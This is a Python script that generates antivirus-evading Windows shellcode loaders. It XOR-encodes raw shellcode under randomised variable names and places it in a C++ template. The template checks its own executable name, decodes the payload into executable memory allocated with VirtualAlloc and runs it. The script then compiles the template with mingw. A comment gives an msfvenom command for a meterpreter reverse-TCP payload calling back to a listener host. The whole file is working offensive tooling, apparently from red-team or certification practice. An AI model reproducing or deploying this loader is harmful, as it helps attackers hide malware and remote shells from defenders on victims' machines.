#!/usr/bin/env python3

import random
import string
from argparse import ArgumentParser
import os


def make_random_str():
    nbr = random.randint(8, 35)
    random_str = ''.join(random.choice(string.ascii_letters) for i in range(nbr))
    return random_str


def xor_shellcode(data, key):
    key_len = len(key)
    keyAsInt = map(ord, key)
    s = bytes(bytearray((
        (data[i] ^ keyAsInt[i % key_len]) for i in range(0, len(data))
    )))
    shellcode = "\\x"
    shellcode += "\\x".join(format(ord(b), '02x') for b in s)
    return shellcode


def open_shellcode(s_path, x_key):
    with open(s_path, "rb") as raw_shellcode:
        return xor_shellcode(bytearray(raw_shellcode.read()), x_key)


def get_template(exe_name, s_path):
    xor_var = make_random_str()
    xor_key = make_random_str()
    shellcode_var = make_random_str()
    encoded_shellcode = open_shellcode(s_path, xor_key)
    counter_var = make_random_str()
    increment_var = make_random_str()
    v_alloc_var = make_random_str()
    shellcode = make_random_str()

    return '''
    #include <windows.h>
    #include <string>
    using namespace std;
    
    int main(int argc, char **argv) {{
        if (strstr(argv[0], "{exe_name}") == NULL) {{ 
            return 1; 
        }}
        
        char {xor_var}[] = "{xor_key}";
        char {shellcode_var}[] = "{encoded_shellcode}";
        char {shellcode}[sizeof {shellcode_var}];
        
        int {counter_var} = 0;
        for(int {increment_var}=0; {increment_var} < sizeof {shellcode_var}; {increment_var}++) {{
            if({counter_var} == sizeof {xor_var} -1) {{
                {counter_var}=0;
            }}
            {shellcode}[{increment_var}] = {shellcode_var}[{increment_var}] ^ {xor_var}[{counter_var}];
            {counter_var}++;
        }}

        void *{v_alloc_var} = VirtualAlloc(0, sizeof {shellcode}, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        memcpy({v_alloc_var}, {shellcode}, sizeof {shellcode});
        ((void(*)()){v_alloc_var})();
    }}
    '''.format(
        exe_name=exe_name,
        xor_var=xor_var,
        xor_key=xor_key,
        shellcode_var=shellcode_var,
        encoded_shellcode=encoded_shellcode,
        counter_var=counter_var,
        increment_var=increment_var,
        v_alloc_var=v_alloc_var,
        shellcode=shellcode,
    )


def make_dir(out_dir):
    the_path = "./out/%s" % out_dir
    os.mkdir(the_path)
    return the_path


def write_template(out_dir, template):
    the_path = "%s/template.cpp" % out_dir
    with open(the_path, 'w') as f:
        f.write(template)


def compile_payload(out_dir, exe_name, arch):
    if arch == 'x86':
        command = 'i686-w64-mingw32-g++ %s/template.cpp -o %s/%s -lws2_32' % (out_dir, out_dir, exe_name)
    else:
        command = 'x86_64-w64-mingw32-g++ %s/template.cpp -o %s/%s' % (out_dir, out_dir, exe_name)

    command += ' -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions ' \
               '-fmerge-all-constants -static-libstdc++ -static-libgcc'

    os.system(command)


def make_cpp_exe(output_dir, exe_name, shellcode_path, architecture):
    output_dir = make_dir(output_dir)
    template = get_template(exe_name, shellcode_path)
    write_template(output_dir, template)
    compile_payload(output_dir, exe_name, architecture)


def run():
    parser = ArgumentParser(usage="usage: %(prog)s [options]")

    parser.add_argument("-o",
                        help="Directory to save the output",
                        type=str,
                        dest="output_dir",
                        default="rv",
                        required=True)

    parser.add_argument("-a",
                        dest="architecture",
                        type=str,
                        default="x64",
                        help="architecture (x86, x64)"
                        )

    parser.add_argument("-n",
                        dest="exe_name",
                        type=str,
                        default="rv.exe",
                        help="name of output exe"
                        )

    #  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.49.118 LPORT=443 EXITFUNC=thread -f raw > shellcode.raw
    parser.add_argument("-s",
                        dest="shellcode_path",
                        type=str,
                        help="raw shellcode path"
                        )

    user_arguments = parser.parse_args()
    make_cpp_exe(
        user_arguments.output_dir,
        user_arguments.exe_name,
        user_arguments.shellcode_path,
        user_arguments.architecture,
    )


if __name__ == '__main__':
    run()
